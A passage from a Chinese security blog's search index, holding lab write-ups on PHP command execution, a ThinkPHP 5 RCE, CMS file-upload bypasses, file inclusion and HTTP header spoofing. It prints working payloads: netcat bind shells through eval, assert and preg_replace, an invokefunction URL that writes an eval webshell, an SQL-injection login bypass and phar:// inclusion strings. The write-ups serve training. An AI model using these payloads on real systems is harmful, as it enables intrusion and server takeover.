反弹成功。 b. array_maparray_map原型 1array_map ( callable $callback , array $array1 [, array $... ] ) 同样直接 1func=exec&amp;nc -lvp 7782 -e /bin/bash c.assertassert原型 1assert ( mixed $assertion [, string $description ] ) payload: 1shell_exec('nc -lvp 7783 -e /bin/bash') d.call_user_func函数原型 1call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 列举目录下文件： 1func=passthru&amp;cmd=ls payload: 1func=passthru&amp;cmd=nc -lvp 7784 -e /bin/bash e.create_funccreate_function ( string $args , string $code ) 同样payload: 1func=passthru&amp;cmd=nc -lvp 7785 -e /bin/bash 发现500了。。。。。。 f.evaleval ( string $code ) 直接shell。 1system('nc -lvp 31321 -e /bin/bash') 连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。 1system('nc -lvp 31321 -e /bin/bash'); 成功反弹shell。 g preg_replace1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 直接cmd=phpinfo(); 反弹shell。 1system('nc -lvp 31322 -e /bin/bash'); h preg_replace2可以在双引号中使用 1&#123;$&#123;代码&#125;&#125; 来执行代码 只能列出目录， 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system(ls)&#125;&#125;[/php] 正向shell出问题了。 1http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=[php]&#123;$&#123;system('nc -lvp 31322 -e /bin/bash')&#125;&#125;[/php] F.sys由于题目较多，所以只进行简单的测试。 com 500错误 exec ls exec_l ls 发现会以数组的形式返回。 fyh ls passthru ls -a popen ls popen_l ls 没反应。此题不会。。。 shell_exec ls system ls G.ThinkPHP V5框架漏洞首先用dirsearch扫描， 发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22. 可以用云悉探测。 搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围： 1ThinkPHP 5.0系列 &lt;5.0.23，ThinkPHP 5.1系列&lt; 5.1.31，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。 所以直接利用 1index.php?s=/index/\\think\\request/cache&amp;key=1|phpinfo 发现不成功。 利用网上的Poc 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 利用成功 正确写shell姿势 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[\"code\"])?^&gt;&gt;shell.php 尝试正向shell。 1http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=nc -lvp 31328 -e /bin/bash 正向shell成功。","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"合天培训_实验_文件上传考核","slug":"合天培训_实验_文件上传考核","date":"2020-05-01T08:50:32.000Z","updated":"2020-05-01T15:47:04.613Z","comments":true,"path":"web/合天培训_实验_文件上传考核/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/","excerpt":"本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。","text":"本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。 1.beecms首先后台登录 绕过登录方法： 12用户名：admi' Un union ion Se%select%lect 1,'admin','9003d1df22eb4d3820015070385194c8',4,0 #密码：pwd 在后台发现上传图片功能： 1http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=add&amp;id=3&amp;nav=add_channel_product&amp;admin_p_nav=content&amp;lang=cn 实际检测，发现是MIME白名单检测，所以Burp改包即可。 然后在图片管理中可以看到上传的文件的路径： 1/vulnlab/sqli/beecms/upload/img/202004201359505400.php 2.fiyocms账户密码admin/admin888登录 找到上传文件的点： 1http://47.105.75.177/vulnlab/upload/fiyocms/dapur/?app=media&amp;type=files 但是上传按钮按不动。其他功能点也没有上传的，放弃。 老师讲了后发现themes下面有漏洞。 （1）任意文件读取 （2）任意文件上传 3.phpok账户密码admin/admin登录 找到修改头像的点，发现只能上传图像。 上传一个后缀名改为gif的php代码。 然后改包： 发现php被过滤了。 php fuzz测试。发现均被过滤了。 换思路，扫后台 扫出admin.php 登录发现不正确，应该用户表和管理员表是两张。 用户名：admin,密码： admin888 (利用其他网站的sql注入获得) 在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。 看burp包得到上传路径： 1res/202004/20/1555e119f9dc2b1f.php 访问资源即可： 1http://47.105.75.177/vulnlab/upload/phpok/res/202004/20/1555e119f9dc2b1f.php 为了方便其他同学做再改回去。 4.geez同样sql注入得到账户名密码：admin/admin445 发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。 然后在主页再检查头像的地址： 得到上传文件： 1./upload/1_dama1.php. 访问： 1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php. 发现不能解析。 改为大小写绕过得到上传文件： 1./upload/1_dama1.php 访问： 1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"合天培训_实验_文件包含漏洞","slug":"合天培训_实验_文件包含漏洞","date":"2020-05-01T04:51:26.000Z","updated":"2020-05-01T15:46:32.052Z","comments":true,"path":"web/合天培训_实验_文件包含漏洞/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","excerpt":"本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。","text":"本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。 本地文件包含（1）提示include.php，访问include.php （2）提示参数为file.利用file=include.php发现文件包含生效。 （3）尝试读取源代码 1file=php://filter/convert.base64-encode/resource=include.php base64解码后： 123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :) &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file); &#125; &#125;?&gt; 可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。 （4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。 上传一个一句话木马post.php。发现上传失败 因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png. 上传成功： 接下来进行文件包含。 http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png 利用菜刀连接即可。 远程文件包含（1）参数有file,提示php文件。代表只输入文件名就可以。 猜测代码： 12$file=$_GET['file'].\"php\";include($file); （2）读源码 file=php://filter/convert.base64-encode/resource=include 123456789101112131415161718&lt;html&gt;Tips: &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file.'.php'); &#125; &#125;?&gt; 题目要求phar，现在上传一个zip文件。 发现不能上传zip。抓包看下是基于什么机制过滤的。 发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg 然后利用phar协议访问zip中的post.php 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://upload/webshell.jpg/post.php 用菜刀连接尝试,发现连接失败。 看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径： 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://../1/upload/webshell.jpg/post.php 发现报错error。 再想一下，不仅忘记去掉后缀名php了，而且不支持.. 尝试使用绝对路径 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar:///var/www/html/vulnlab/include/1/upload/webshell.jpg/post 菜刀连接，成功连接","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"合天培训_实验_web安全之HTTP头部字段理解","slug":"合天培训_实验_web安全之HTTP头部字段理解","date":"2020-04-30T12:55:32.000Z","updated":"2020-05-01T15:47:22.127Z","comments":true,"path":"web/合天培训_实验_web安全之HTTP头部字段理解/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/","excerpt":"本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。","text":"本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。 第一题 观察HTTP 响应头题目提示观察http响应头所以只观察响应头即可。通过命令 1curl -v 47.105.75.177/vulnlab/head/1.php 得到: 1key: hello world! 第二题 Referer理解提示必须从www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段 通过命令 1curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php 从响应中获取key: 1key: you are right 第三题 X-Forwarded-For理解通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 http://www.hetianlab.com/ 。先curl下： 1curl 47.105.75.177/vulnlab/head/3.php 得到： 1this page only accept come from localhost 本地才能访问，所以伪造X-Forwarded-For为127.0.0.1 1curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php 得到key 1key: you are right 第四题 User-Agent理解题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令： 1curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php 得到key: 1key: you are right 第五题 Accept-Language理解 题目提示只允许外国人登录,猜测接收语言为英语即可。 1curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php 第六题 Cookie理解题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。 1curl -v 47.105.75.177/vulnlab/head/6.php 发现响应头中会设置cookie: 1Set-Cookie: Login=anonymous 所以请求时将cookie设置为Login=admin即可。 1curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}],"categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}